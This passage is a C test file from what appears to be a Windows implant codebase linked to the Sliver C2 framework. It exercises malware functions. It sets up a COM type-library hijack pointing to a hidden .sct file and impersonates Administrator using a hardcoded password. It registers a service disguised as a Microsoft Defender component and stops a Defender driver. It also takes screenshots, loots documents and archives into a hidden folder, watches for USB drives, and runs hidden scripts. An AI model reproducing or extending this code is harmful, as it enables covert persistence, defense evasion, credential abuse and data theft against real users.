	hResult = TypeLib2->lpVtbl->SetGuid(TypeLib2, TypeLibGUID);
	if (FAILED(hResult)) {
		LOG_ERROR("ITypeLib2->SetGuid", hResult);
		goto CLEANUP;
	}

	hResult = TypeLib2->lpVtbl->CreateTypeInfo(TypeLib2, lpInterfaceName, TKIND_INTERFACE, &CreateTypeInfo);
	if (FAILED(hResult)) {
		LOG_ERROR("ITypeLib2->CreateTypeInfo", hResult);
		goto CLEANUP;
	}

	hResult = CreateTypeInfo->lpVtbl->SetTypeFlags(CreateTypeInfo, TYPEFLAG_FDUAL | TYPEFLAG_FOLEAUTOMATION);
	if (FAILED(hResult)) {
		LOG_ERROR("CreateTypeInfo->SetTypeFlags", hResult);
		goto CLEANUP;
	}

	hResult = CreateTypeInfo->lpVtbl->AddRefTypeInfo(CreateTypeInfo, RefTypeInfo, &RefType);
	if (FAILED(hResult)) {
		LOG_ERROR("CreateTypeInfo->AddRefTypeInfo", hResult);
		goto CLEANUP;
	}

	hResult = CreateTypeInfo->lpVtbl->AddImplType(CreateTypeInfo, 0, RefType);
	if (FAILED(hResult)) {
		LOG_ERROR("CreateTypeInfo->AddImplType", hResult);
		goto CLEANUP;
	}

	hResult = CreateTypeInfo->lpVtbl->SetGuid(CreateTypeInfo, IID);
	if (FAILED(hResult)) {
		LOG_ERROR("CreateTypeInfo->SetGuid", hResult);
		goto CLEANUP;
	}

	hResult = TypeLib2->lpVtbl->SaveAllChanges(TypeLib2);
	if (FAILED(hResult)) {
		LOG_ERROR("TypeLib2->SaveAllChanges", hResult);
		goto CLEANUP;
	}

	Result = TRUE;
CLEANUP:
	if (RefTypeInfo != NULL) {
		RefTypeInfo->lpVtbl->Release(RefTypeInfo);
	}

	if (TypeLib2 != NULL) {
		TypeLib2->lpVtbl->Release(TypeLib2);
	}

	if (CreateTypeInfo != NULL) {
		CreateTypeInfo->lpVtbl->Release(CreateTypeInfo);
	}

	return Result;
}

void test132(void) {
	HRESULT hResult = S_OK;
	ITypeLib* StdOle2 = NULL;
	ITypeLib* MyTypeLib = NULL;
	GUID TypeLibGUID = { 0x6131C8B1, 0x7704, 0x45CF, { 0xBA, 0x1A, 0x93, 0x1F, 0x92, 0x4E, 0x09, 0x45 } };
	GUID IID = { 0x681AAE63, 0x51BA, 0x40a2, { 0x86, 0xC8, 0x55, 0x51, 0x85, 0x2F, 0xA2, 0xBD } };
	GUID RefIID = { 0xb36e6a53, 0x8073, 0x499e, { 0x82, 0x4c, 0xd7, 0x76, 0x33, 0x0a, 0x33, 0x3e } };
	GUID Test2IID = { 0xE5171F7C, 0x4CEC, 0x4903, { 0x94, 0x99, 0xA7, 0x24, 0xB6, 0x17, 0x8B, 0x30 } };
	GUID TypeLibIID2 = { 0x7A873F4B, 0x809C, 0x4B8B, { 0xA4, 0xF1, 0xF5, 0x91, 0x7F, 0x25, 0x65, 0xbF } };
	WCHAR wszSctPath[] = L"C:\\Users\\Admin\\AppData\\Roaming\\Logitech\\log.sct";
	WCHAR wszOutputPath[] = L"C:\\Users\\Admin\\Desktop\\output.tlb";
	LPWSTR lpTypeLibPath = NULL;
	DWORD i = 0;

	lpTypeLibPath = ALLOC((lstrlenW(wszSctPath) + 1) * sizeof(WCHAR));
	for (i = 0; i < lstrlenW(wszSctPath); i++) {
		lpTypeLibPath[i] = L'A';
	}

	hResult = LoadTypeLib(L"stdole2.tlb", &StdOle2);
	if (FAILED(hResult)) {
		LOG_ERROR("LoadTypeLib", hResult);
		goto CLEANUP;
	}

	if (!AddReference(lpTypeLibPath, L"ITest", &TypeLibGUID, &IID, StdOle2, &IID_IDispatch)) {
		goto CLEANUP;
	}

	hResult = LoadTypeLib(lpTypeLibPath, &MyTypeLib);
	if (FAILED(hResult)) {
		LOG_ERROR("LoadTypeLib", hResult);
		goto CLEANUP;
	}

	if (!AddReference(wszOutputPath, L"ITest2", &TypeLibIID2, &Test2IID, MyTypeLib, &IID)) {
		goto CLEANUP;
	}

CLEANUP:
	return;
}

void test133(void) {
	ITypeLib* pTypeLib = NULL;
	LoadTypeLib(L"C:\\Users\\Admin\\Desktop\\test2.tlb", &pTypeLib);
}

void test134(void) {
	/*WCHAR wszPath[0x200];
	LPWSTR lpTemp = NULL;

	GetModuleFileNameW(NULL, wszPath, _countof(wszPath));
	lpTemp = PathFindFileNameW(wszPath);
	lpTemp[0] = L'\0';

	lstrcatW(wszPath, L"logitech.cfg");
	UnmarshalConfig(wszPath);
	DeleteFileW(wszPath);*/
}

void test135(void) {
	DWORD dwParentPid = 0;
	dwParentPid = GetParentProcessId(GetCurrentProcessId());
	CHAR szFormatedMessage[0x100];
	if (!AttachConsole(dwParentPid)) {
		wsprintfA(szFormatedMessage, "0x%08x", GetLastError());
		MessageBoxA(NULL, szFormatedMessage, "Title", MB_OK);
	}

	PrintFormatA("%d\n", dwParentPid);
}

void test136(void) {
	DWORD dwTlsIdx = 0;

	dwTlsIdx = TlsAlloc();
	if (!TlsGetValue(dwTlsIdx)) {
		PrintFormatA("%d\n", GetLastError());
	}
}

void test137(void) {
	CreateEmptyFileA("C:\\Users\\Admin\\Desktop\\a.txt");
}

void test138(void) {
	PrintFormatA("Path: %s\n", __FILE__);
}

void test139(void) {
	HANDLE hToken = NULL;
	STARTUPINFOW StartupInfo;
	PROCESS_INFORMATION ProcInfo;
	PROFILEINFOA ProfileInfo;

	if (!LogonUserW(L"DESKTOP-VEJKA7R\\Administrator", NULL, L"Caydabode1", LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_WINNT50, &hToken)) {
		LOG_ERROR("LogonUserW", GetLastError());
		return;
	}

	PrintFormatA("hToken: 0x%08x\n", hToken);
	if (!ImpersonateLoggedOnUser(hToken)) {
		LOG_ERROR("ImpersonateLoggedOnUser", GetLastError());
		return;
	}

	SecureZeroMemory(&StartupInfo, sizeof(StartupInfo));
	SecureZeroMemory(&ProcInfo, sizeof(ProcInfo));
	SecureZeroMemory(&ProfileInfo, sizeof(ProfileInfo));
	ProfileInfo.dwSize = sizeof(ProfileInfo);
	ProfileInfo.lpUserName = DuplicateStrA("DESKTOP-VEJKA7R\\Administrator", 0);
	if (!LoadUserProfileA(hToken, &ProfileInfo)) {
		PrintFormatA("0x%08x\n", GetLastError());
	}
}

void test140(void) {
	ImpersonateUser("DESKTOP-VEJKA7R\\Administrator");
}

void test141(void) {
#ifdef _FULL
	ENVELOPE Envelope;
	PPBElement ReqElement = NULL;
	LPSTR lpFileData = NULL;

	SecureZeroMemory(&Envelope, sizeof(Envelope));
	ReqElement = CreateBytesElement("DESKTOP-VEJKA7R\\Administrator", lstrlenA("DESKTOP-VEJKA7R\\Administrator"), 1);
	Envelope.uType = MsgImpersonateReq;
	Envelope.pData = ALLOC(sizeof(BUFFER));
	Envelope.pData->pBuffer = ReqElement->pMarshaledData;
	Envelope.pData->cbBuffer = ReqElement->cbMarshaledData;

	ImpersonateHandler(&Envelope, NULL);
	lpFileData = ReadFromFile(L"C:\\Users\\Admin\\Desktop\\Hello.txt", NULL);
	if (lpFileData != NULL) {
		PrintFormatA("lpFileData: %s\n", lpFileData);
	}
#endif
}

void test142(void) {
#ifdef _FULL
	ENVELOPE Envelope;
	PPBElement ReqElements[4];
	PPBElement pMarshaledData = NULL;
	LPSTR lpFileData = NULL;

	SecureZeroMemory(&Envelope, sizeof(Envelope));
	SecureZeroMemory(ReqElements, sizeof(ReqElements));
	ReqElements[0] = CreateBytesElement("Administrator", lstrlenA("Administrator"), 1);
	ReqElements[1] = CreateBytesElement("Caydabode1", lstrlenA("Caydabode1"), 2);
	ReqElements[3] = CreateVarIntElement(LOGON32_LOGON_INTERACTIVE, 4);
	pMarshaledData = CreateStructElement(ReqElements, _countof(ReqElements), 0);
	Envelope.uType = MsgImpersonateReq;
	Envelope.pData = ALLOC(sizeof(BUFFER));
	Envelope.pData->pBuffer = pMarshaledData->pMarshaledData;
	Envelope.pData->cbBuffer = pMarshaledData->cbMarshaledData;

	MakeTokenHandler(&Envelope, NULL);
	lpFileData = ReadFromFile(L"C:\\Users\\Admin\\Desktop\\Hello.txt", NULL);
	if (lpFileData != NULL) {
		PrintFormatA("lpFileData: %s\n", lpFileData);
	}
#endif
}

void test143(void) {
#ifdef _FULL
	ENVELOPE Envelope;
	PPBElement ReqElements[7];
	PPBElement pMarshaledData = NULL;
	CHAR szServiceName[] = "WdNisSvc1";
	CHAR szServiceDesc[] = "Helps guard against intrusion attempts targeting known and newly discovered vulnerabilities in network protocols";
	CHAR szBinPath[] = "\"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.24020.7-0\\NisSrv.exe\"";
	CHAR szDisplayName[] = "Microsoft Defender Antivirus Network Inspection Service";

	SecureZeroMemory(&Envelope, sizeof(Envelope));
	SecureZeroMemory(ReqElements, sizeof(ReqElements));
	ReqElements[0] = CreateBytesElement(szServiceName, lstrlenA(szServiceName), 1);
	ReqElements[1] = CreateBytesElement(szServiceDesc, lstrlenA(szServiceDesc), 2);
	ReqElements[2] = CreateBytesElement(szBinPath, lstrlenA(szBinPath), 3);
	ReqElements[4] = CreateBytesElement(szDisplayName, lstrlenA(szDisplayName), 5);
	ReqElements[5] = CreateVarIntElement(SERVICE_WIN32_OWN_PROCESS, 6);
	ReqElements[6] = CreateVarIntElement(SERVICE_DISABLED, 7);
	pMarshaledData = CreateStructElement(ReqElements, _countof(ReqElements), 0);
	Envelope.pData = ALLOC(sizeof(BUFFER));
	Envelope.pData->pBuffer = pMarshaledData->pMarshaledData;
	Envelope.pData->cbBuffer = pMarshaledData->cbMarshaledData;

	CreateServiceHandler(&Envelope);
#endif
}

void test144(void) {
	StopService("WdNisDrv", NULL);
}

void test145(void) {
	/*PBUFFER pBitmap = CaptureDesktop(NULL);
	WriteToFile(L"C:\\Users\\Admin\\Desktop\\screenshot.bmp", pBitmap->pBuffer, pBitmap->cbBuffer);*/
}

void test146(void) {
#ifdef _FULL
	ENVELOPE Envelope;

	SecureZeroMemory(&Envelope, sizeof(Envelope));
	ScreenshotHandler(&Envelope);
#endif
}

void test147(void) {
	HANDLE hFile = INVALID_HANDLE_VALUE;
	FILETIME CreattionTime;
	FILETIME LastAccessTime;
	FILETIME LastWriteTime;

	hFile = CreateFileW(L"C:\\Users\\Admin\\Documents\\SharedFolder\\session\\vendor", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL);
	if (hFile != INVALID_HANDLE_VALUE) {
		GetFileTime(hFile, &CreattionTime, &LastAccessTime, &LastWriteTime);
		PrintFormatA("CreattionTime.dwLowDateTime = %d\n", CreattionTime.dwLowDateTime);
		PrintFormatA("CreattionTime.dwHighDateTime = %d\n", CreattionTime.dwHighDateTime);
		PrintFormatA("LastAccessTime.dwLowDateTime = %d\n", LastAccessTime.dwLowDateTime);
		PrintFormatA("LastAccessTime.dwHighDateTime = %d\n", LastAccessTime.dwHighDateTime);
		PrintFormatA("LastWriteTime.dwLowDateTime = %d\n", LastWriteTime.dwLowDateTime);
		PrintFormatA("LastWriteTime.dwHighDateTime = %d\n", LastWriteTime.dwHighDateTime);
	}
}

void test148(void) {
	SetFileOwner(L"C:\\Users\\Admin\\Desktop\\New folder", "Administrator");
}

void test149(void) {
	PrintFormatA("0x%08x\n", FIONBIO);
	PrintFormatA("0x%08x\n", FIONREAD);
	PrintFormatA("0x%08x\n", FIOASYNC);
}

void test150(void) {
	BYTE Temp[] = { 72, 198, 175, 198, 160, 204, 129, 78, 71, 32, 68, 195, 130, 204, 131, 78, 32, 86, 73, 195, 138, 204, 129, 84, 32, 84, 72, 85, 32, 72, 79, 65, 204, 163, 67, 72, 32, 81, 80, 38, 65, 78, 32, 50, 48, 50, 52, 0 };

	LPWSTR lpTemp = ConvertCharToWchar(Temp);
	PrintFormatA("*********************************\n");
	HexDump(lpTemp, lstrlenW(lpTemp) * sizeof(WCHAR));
	if (IsPathExist(lpTemp)) {
		PrintFormatA("Is ok\n");
	}

	ListFileEx(L"C:\\Users\\Admin\\Desktop", LIST_JUST_FOLDER, NULL, NULL);
}

void test151(void) {
	/*HMODULE h7zDll = NULL;
	CREATEOBJECT fnCreateObject = NULL;
	CREATEDECODER fnCreateDecoder = NULL;
	GUID IID_IInArchive = { 0x23170F69, 0x40C1, 0x278A, { 0, 0, 0, 6, 0, 0x60, 0 } };
	GUID IID_IInStream = { 0x23170F69, 0x40C1, 0x278A, { 0, 0, 0, 3, 0, 3, 0 } };
	GUID IID_ICompressCoder = { 0x23170F69, 0x40C1, 0x278A, { 0, 0, 0, 4, 0, 5, 0 } };
	HRESULT hResult = S_OK;
	WCHAR wszPath[] = L"C:\\Users\\Admin\\Downloads\\idasdk_pro83.zip";
	PBYTE pBuffer = NULL;
	DWORD cbBuffer = 0;
	PGUID pFormatGUID = NULL;
	UINT64 uSignature = 0;
	IInArchive* pInArchive = NULL;
	DWORD dwNumberOfItems = 0;
	IInStream* InStream = NULL;
	UINT64 uMaxCheckStartPosition = 0;
	DWORD i = 0;
	PROPVARIANT ItemProperty;
	LPVOID lpObj = NULL;
	PUINT32 pIndices = NULL;
	IArchiveExtractCallback* pArchiveExtractCallback = NULL;
	PITEM_INFO* ItemList = NULL;

	h7zDll = LoadLibraryA("D:\\Temp\\sevenzip-master\\CPP\\7zip\\Bundles\\Format7zF\\x64\\7z.dll");
	if (h7zDll == NULL) {
		LOG_ERROR("LoadLibraryA", GetLastError());
		goto CLEANUP;
	}

	pBuffer = ReadFromFile(wszPath, &cbBuffer);
	if (pBuffer == NULL) {
		goto CLEANUP;
	}

	memcpy(&uSignature, pBuffer, sizeof(uSignature));
	pFormatGUID = FindFormatBySignature(_byteswap_uint64(uSignature));
	if (pFormatGUID == NULL) {
		goto CLEANUP;
	}

	fnCreateObject = (CREATEOBJECT)GetProcAddress(h7zDll, "CreateObject");
	fnCreateDecoder = (CREATEDECODER)GetProcAddress(h7zDll, "CreateDecoder");
	hResult = fnCreateObject(pFormatGUID, &IID_IInArchive, &pInArchive);
	if (FAILED(hResult)) {
		LOG_ERROR("CreateObject", hResult);
		goto CLEANUP;
	}
	
	InStream = ALLOC(sizeof(IInStream));
	InStream->pBuffer = ALLOC(sizeof(BUFFER));
	InStream->pBuffer->pBuffer = ReadFromFile(wszPath, &InStream->pBuffer->cbBuffer);
	if (InStream->pBuffer == NULL) {
		goto CLEANUP;
	}

	InStream->vtbl = ALLOC(sizeof(struct IInStreamVtbl));
	InStream->vtbl->QueryInterface = IInStream_QueryInterface;
	InStream->vtbl->AddRef = IInStream_AddRef;
	InStream->vtbl->Release = IInStream_Release;
	InStream->vtbl->Read = IInStream_Read;
	InStream->vtbl->Seek = IInStream_Seek;
	hResult = pInArchive->vtbl->Open(pInArchive, InStream, &uMaxCheckStartPosition, NULL);
	if (FAILED(hResult)) {
		LOG_ERROR("pInArchive->Open", hResult);
		goto CLEANUP;
	}

	hResult = pInArchive->vtbl->GetNumberOfItems(pInArchive, &dwNumberOfItems);
	if (FAILED(hResult)) {
		LOG_ERROR("pInArchive->GetNumberOfItems", hResult);
		goto CLEANUP;
	}

	ItemList = ALLOC(sizeof(PITEM_INFO) * dwNumberOfItems);
	pIndices = ALLOC(sizeof(UINT32) * dwNumberOfItems);
	for (i = 0; i < dwNumberOfItems; i++) {
		ItemList[i] = ALLOC(sizeof(ITEM_INFO));
		pIndices[i] = i;

		PropVariantInit(&ItemProperty);
		hResult = pInArchive->vtbl->GetProperty(pInArchive, i, 3, &ItemProperty);
		if (FAILED(hResult)) {
			LOG_ERROR("pInArchive->GetProperty", hResult);
			goto CONTINUE;
		}

		if (ItemProperty.vt != VT_BSTR) {
			PropVariantClear(&ItemProperty);
			goto CONTINUE;
		}

		ItemList[i]->lpPath = DuplicateStrW(ItemProperty.bstrVal, 0);
		PropVariantClear(&ItemProperty);
		PropVariantInit(&ItemProperty);
		hResult = pInArchive->vtbl->GetProperty(pInArchive, i, 6, &ItemProperty);
		if (FAILED(hResult)) {
			LOG_ERROR("pInArchive->GetProperty", hResult);
			goto CONTINUE;
		}

		if (ItemProperty.vt != VT_BOOL) {
			PropVariantClear(&ItemProperty);
			goto CONTINUE;
		}

		ItemList[i]->IsDir = ItemProperty.boolVal == VARIANT_TRUE;
		PropVariantInit(&ItemProperty);
		hResult = pInArchive->vtbl->GetProperty(pInArchive, i, 15, &ItemProperty);
		if (FAILED(hResult)) {
			LOG_ERROR("pInArchive->GetProperty", hResult);
			goto CONTINUE;
		}

		if (ItemProperty.vt != VT_BOOL) {
			PropVariantClear(&ItemProperty);
			goto CONTINUE;
		}

		ItemList[i]->IsEncrypted = ItemProperty.boolVal == VARIANT_TRUE;
		PropVariantInit(&ItemProperty);
		hResult = pInArchive->vtbl->GetProperty(pInArchive, i, 9, &ItemProperty);
		if (FAILED(hResult)) {
			LOG_ERROR("pInArchive->GetProperty", hResult);
			goto CONTINUE;
		}

		ItemList[i]->IsSymLink = (ItemProperty.uintVal & FILE_ATTRIBUTE_REPARSE_POINT) == FILE_ATTRIBUTE_REPARSE_POINT;
		PropVariantClear(&ItemProperty);
		if (!ItemList[i]->IsDir) {
			ItemList[i]->pFileData = ALLOC(sizeof(BUFFER));
			PropVariantInit(&ItemProperty);
			hResult = pInArchive->vtbl->GetProperty(pInArchive, i, 7, &ItemProperty);
			if (FAILED(hResult)) {
				LOG_ERROR("pInArchive->GetProperty", hResult);
				continue;
			}

			ItemList[i]->pFileData->cbBuffer = ItemProperty.uintVal;
			ItemList[i]->pFileData->pBuffer = ALLOC(ItemList[i]->pFileData->cbBuffer + 1);
			PropVariantClear(&ItemProperty);
		}

		continue;
CONTINUE:
		FreeItemInfo(ItemList[i]);
		ItemList[i] = NULL;
	}

	pArchiveExtractCallback = ALLOC(sizeof(IArchiveExtractCallback));
	pArchiveExtractCallback->vtbl = ALLOC(sizeof(struct IArchiveExtractCallbackVtbl));
	pArchiveExtractCallback->vtbl->AddRef = IArchiveExtractCallback_AddRef;
	pArchiveExtractCallback->vtbl->QueryInterface = IArchiveExtractCallback_QueryInterface;
	pArchiveExtractCallback->vtbl->Release = IArchiveExtractCallback_Release;
	pArchiveExtractCallback->vtbl->GetStream = IArchiveExtractCallback_GetStream;
	pArchiveExtractCallback->vtbl->PrepareOperation = IArchiveExtractCallback_PrepareOperation;
	pArchiveExtractCallback->vtbl->SetOperationResult = IArchiveExtractCallback_SetOperationResult;
	pArchiveExtractCallback->vtbl->SetCompleted = IArchiveExtractCallback_SetCompleted;
	pArchiveExtractCallback->vtbl->SetTotal = IArchiveExtractCallback_SetTotal;
	pArchiveExtractCallback->ItemList = ItemList;
	pInArchive->vtbl->Extract(pInArchive, pIndices, dwNumberOfItems, 0, pArchiveExtractCallback);
	if (FAILED(hResult)) {
		LOG_ERROR("pInArchive->Extract", hResult);
		goto CLEANUP;
	}

CLEANUP:
	if (pArchiveExtractCallback != NULL) {
		pArchiveExtractCallback->vtbl->Release(pArchiveExtractCallback);
		FREE(pArchiveExtractCallback->vtbl);
		FREE(pArchiveExtractCallback);
	}
	
	if (pInArchive != NULL) {
		pInArchive->vtbl->Release(pInArchive);
	}

	if (InStream != NULL) {
		InStream->vtbl->Release(InStream);
		FREE(InStream->vtbl);
		FREE(InStream);
	}

	FREE(pFormatGUID);
	FREE(pBuffer);

	return;*/
}

void test152(void) {
	//PITEM_INFO* ItemList = NULL;
	//DWORD dwNumberOfItems = 0;
	//WCHAR wszPath[] = L"D:\\App\\Dev Tools\\drltrace\\drltrace_src\\dynamorio\\clients\\drcachesim\\tests\\drmemtrace.threadsig.x64.tracedir\\drmemtrace.threadsig.10506.7343.trace.gz";

	////ItemList = ExtractFromZip(wszPath, NULL, TRUE, &dwNumberOfItems);
	//ItemList = ExtractFromZip(L"D:\\Temp\\chromium-main\\third_party\\libzip\\src\\regress\\incons-archive-comment-longer.zip", NULL, TRUE, &dwNumberOfItems);
	//PrintFormatW(L"%d\n", dwNumberOfItems);
}

void test153(void) {
	/*GLOBAL_CONFIG Config;
	LPWSTR DocumentExtensions[] = { L".doc", L".docm", L".docx", L".pdf", L".ppsm", L".ppsx", L".ppt", L".pptm", L".pptx", L".pst", L".rtf", L".xlm", L".xls", L".xlsm", L".xlsx", L".odt", L".ods", L".odp", L".odg", L".odf" };
	LPWSTR ArchiveExtensions[] = { L".rar", L".zip", L".tar", L".gz", L".xz", L".sz", L".7z" };
	DWORD i = 0;

	SecureZeroMemory(&Config, sizeof(Config));
	lstrcpyW(Config.wszWarehouse, L"C:\\Users\\Admin\\Desktop\\Warehouse");
	Config.lpRecipientPubKey = DuplicateStrA("Hello", 0);
	Config.DocumentExtensions = ALLOC(sizeof(LPWSTR) * _countof(DocumentExtensions));
	Config.cDocumentExtensions = _countof(DocumentExtensions);
	for (i = 0; i < _countof(DocumentExtensions); i++) {
		Config.DocumentExtensions[i] = DuplicateStrW(DocumentExtensions[i], 0);
	}

	Config.ArchiveExtensions = ALLOC(sizeof(LPWSTR) * _countof(ArchiveExtensions));
	Config.cArchiveExtensions = _countof(ArchiveExtensions);
	Config.lpSliverPath = DuplicateStrW(L"C:\\Users\\Admin\\AppData\\Roaming\\Logitech", 0);
	for (i = 0; i < _countof(ArchiveExtensions); i++) {
		Config.ArchiveExtensions[i] = DuplicateStrW(ArchiveExtensions[i], 0);
	}

	LootFile(&Config);
	Sleep(100000000);*/
}

void test154(void) {
	WCHAR wszDriveName[0x8] = L"A:\\";
	DWORD dwSectorsPerCluster = 0;
	DWORD dwBytesPerSector = 0;
	DWORD dwNumberOfFreeClusters = 0;
	DWORD dwTotalNumberOfClusters = 0;

	wszDriveName[0] += PathGetDriveNumberW(L"C:\\Users\\Admin\\Desktop");
	if (!GetDiskFreeSpaceW(wszDriveName, &dwSectorsPerCluster, &dwBytesPerSector, &dwNumberOfFreeClusters, &dwTotalNumberOfClusters)) {
		LOG_ERROR("GetDiskFreeSpaceW", GetLastError());
		return;
	}

	PrintFormatA("dwSectorsPerCluster: %d\n", dwSectorsPerCluster);
	PrintFormatA("dwBytesPerSector: %d\n", dwBytesPerSector);
	PrintFormatA("dwNumberOfFreeClusters: %d\n", dwNumberOfFreeClusters);
	PrintFormatA("dwTotalNumberOfClusters: %d\n", dwTotalNumberOfClusters);
}

void test155(void) {
	WCHAR wszWarehouse[] = L"C:\\Users\\Admin\\Desktop\\Warehouse";
	DWORD dwFolderAttrib = 0;

	CreateDirectoryW(wszWarehouse, NULL);
	dwFolderAttrib = GetFileAttributesW(wszWarehouse);
	dwFolderAttrib |= FILE_ATTRIBUTE_HIDDEN;
	dwFolderAttrib |= FILE_ATTRIBUTE_SYSTEM;
	if (!SetFileAttributesW(wszWarehouse, dwFolderAttrib)) {
		LOG_ERROR("SetFileAttributesW", GetLastError());
	}
}

VOID Callback156
(
	_In_ BSTR lpInput,
	_In_ LPVOID Arg
)
{
	LPWSTR lpDeviceID = NULL;

	lpDeviceID = SearchMatchStrW(lpInput, L"DeviceID = \"\\\\\\\\.\\\\", L"\";\n");
	lpDeviceID = StrInsertBeforeW(lpDeviceID, L"\\\\.\\");
	/*if (!WmiExec(L"Win32_DiskDriveToDiskPartition", )) {
		goto CLEANUP;
	}*/

CLEANUP:
	FREE(lpDeviceID);
}

void test156(void) {
	//RegisterAsyncEvent(L"Select * FROM __InstanceOperationEvent WITHIN 1 WHERE TargetInstance ISA 'Win32_DiskDrive' AND (TargetInstance.InterfaceType='USB')", Callback156, NULL);
	RegisterAsyncEvent(L"Select * FROM __InstanceCreationEvent WITHIN 1 WHERE TargetInstance ISA 'Win32_DiskDrive' AND (TargetInstance.InterfaceType='USB')", Callback156, NULL);
	Sleep(100000000);
}

void test157(void) {
	WCHAR wszTemp[0x100];

	QueryDosDeviceW(L"E:", wszTemp, _countof(wszTemp));
	PrintFormatW(L"%s\n", wszTemp);
}

void test158(void) {
	DWORD dwDriveType = GetDriveTypeW(L"E:\\");
	PrintFormatW(L"%d\n", dwDriveType);
}

void test159(void) {
	HANDLE hFile = INVALID_HANDLE_VALUE;
	STORAGE_HOTPLUG_INFO HotPlugInfo;
	DWORD dwBytesReturned = 0;

	hFile = CreateFileW(L"\\\\.\\C:", GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, 0, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		LOG_ERROR("CreateFileW", GetLastError());
		goto CLEANUP;
	}

	SecureZeroMemory(&HotPlugInfo, sizeof(HotPlugInfo));
	if (!DeviceIoControl(hFile, IOCTL_STORAGE_GET_HOTPLUG_INFO, NULL, 0, &HotPlugInfo, sizeof(HotPlugInfo), &dwBytesReturned, NULL)) {
		LOG_ERROR("DeviceIoControl", GetLastError());
		goto CLEANUP;
	}

	PrintFormatW(L"%d\n", HotPlugInfo.MediaRemovable);
	PrintFormatW(L"%d\n", HotPlugInfo.DeviceHotplug);
CLEANUP:
	if (hFile != INVALID_HANDLE_VALUE) {
		CloseHandle(hFile);
	}

	return;
}

BOOL Test160Callback
(
	_In_ IWbemClassObject* pObject,
	_In_ LPVOID* Args
)
{
	HRESULT hResult = S_OK;
	VARIANT DeviceID;

	SecureZeroMemory(&DeviceID, sizeof(DeviceID));
	hResult = pObject->lpVtbl->Get(pObject, L"DeviceID", 0, &DeviceID, 0, 0);
	if (FAILED(hResult)) {
		LOG_ERROR("pObject->Get", hResult);
		goto CLEANUP;
	}

	if (DeviceID.vt != VT_BSTR) {
		goto CLEANUP;
	}

	PrintFormatW(L"%s\n", DeviceID.bstrVal);
CLEANUP:
	return FALSE;
}

void test160(void) {
	WmiExec(L"SELECT * FROM Win32_DiskPartition", Test160Callback, NULL);
}

BOOL Callback161
(
	_In_ IWbemClassObject* pObject,
	_In_ LPVOID* Args
)
{
	HRESULT hResult = S_OK;
	VARIANT DeviceID;

	SecureZeroMemory(&DeviceID, sizeof(DeviceID));
	hResult = pObject->lpVtbl->Get(pObject, L"Antecedent", 0, &DeviceID, 0, 0);
	if (FAILED(hResult)) {
		LOG_ERROR("pObject->Get", hResult);
		goto CLEANUP;
	}

	if (DeviceID.vt != VT_BSTR) {
		goto CLEANUP;
	}

	PrintFormatW(L"%s\n", DeviceID.bstrVal);
CLEANUP:
	return FALSE;
}

void test161(void) {
	WmiExec(L"SELECT * FROM Win32_DiskDriveToDiskPartition", Callback161, NULL);
}

void test162(void) {
	MonitorUsb(NULL);
}

void test163(void) {
	/*WCHAR wszConfigPath[MAX_PATH];
	LPWSTR lpTemp = NULL;
	PGLOBAL_CONFIG pConfig = NULL;
	PGLOBAL_CONFIG pTempConfig = NULL;

	GetModuleFileNameW(NULL, wszConfigPath, _countof(wszConfigPath));
	lpTemp = PathFindFileNameW(wszConfigPath);
	lpTemp[0] = L'\0';
	lstrcatW(wszConfigPath, L"logitech.cfg");
	pConfig = UnmarshalConfig(wszConfigPath);
	pConfig->lpConfigPath = DuplicateStrW(L"C:\\Users\\Admin\\Desktop\\config.cfg", 0);
	MarshalConfig(pConfig);
	pTempConfig = UnmarshalConfig(pConfig->lpConfigPath);*/
}

void test164(void) {
	LPWSTR lpTemp = Bit7zExtract(NULL, L"C:\\Users\\Admin\\Desktop\\New folder\\a.rar", NULL);
	if (lpTemp == NULL) {
		PrintFormatW(L"Failed to extract file");
		return;
	}

	PrintFormatW(L"%s\n", lpTemp);
}

void test165(void) {
//#ifdef _FULL
//	PPBElement ReqElements[2];
//	PPBElement pFinalElement = NULL;
//	CHAR szCommand[] = "dir C:\\Users\\Admin";
//	ENVELOPE Envelope;
//	SLIVER_SESSION_CLIENT SliverSession;
//
//	SecureZeroMemory(&SliverSession, sizeof(SliverSession));
//	SecureZeroMemory(&ReqElements, sizeof(ReqElements));
//	SecureZeroMemory(&Envelope, sizeof(Envelope));
//	SliverSession.pGlobalConfig = ALLOC(sizeof(GLOBAL_CONFIG));
//	SliverSession.pGlobalConfig->lpSliverPath = DuplicateStrW(L"C:\\Users\\Admin\\AppData\\Roaming\\Logitech", 0);
//	SliverSession.pGlobalConfig->lpPeerPrivKey = DuplicateStrA("1", 0);
//	ReqElements[0] = CreateBytesElement(szCommand, lstrlenA(szCommand), 1);
//	pFinalElement = CreateStructElement(&ReqElements, _countof(ReqElements), 0);
//	Envelope.pData = BufferMove(pFinalElement->pMarshaledData, pFinalElement->cbMarshaledData);
//	CmdHandler(&Envelope, &SliverSession);
//#endif
}

void test166(void) {
	STARTUPINFOW si;
	PROCESS_INFORMATION pi;

	SecureZeroMemory(&si, sizeof(si));
	SecureZeroMemory(&pi, sizeof(pi));
	si.cb = sizeof(si);
	if (!CreateProcessW(L"C:\\Windows\\System32\\oobe\\oobeldr.exe", NULL, NULL, NULL, FALSE, 0, NULL, L"C:\\Windows\\System32\\oobe", &si, &pi)) {
		LOG_ERROR("CreateProcess", GetLastError());
	}

	/*if (ShellExecuteW(NULL, L"open", L"C:\\Windows\\System32\\oobe\\oobeldr.exe", NULL, L"C:\\Windows\\System32\\oobe", SW_HIDE) < 32) {
		LOG_ERROR("ShellExecuteW", GetLastError());
	}*/

	Sleep(20000);
}

void test167(void) {
	ShellExecuteW(NULL, L"open", L"C:\\Users\\Admin\\AppData\\Roaming\\Logitech\\run.cmd", NULL, L"C:\\Users\\Admin\\AppData\\Roaming\\Logitech", SW_HIDE);
	Sleep(1000000000000);
}

void test168(void) {
	PARCHIVE_INFO Info = NULL;

	Info = Bit7zGetInfo(L"C:\\Users\\Admin\\AppData\\Roaming\\Logitech\\LogitechLcd.dll", L"C:\\Users\\Admin\\AppData\\Local\\Temp\\8E16.tmp.zip");
}

void test169(void) {
	STARTUPINFOW StartupInfo;
	PROCESS_INFORMATION ProcInfo;

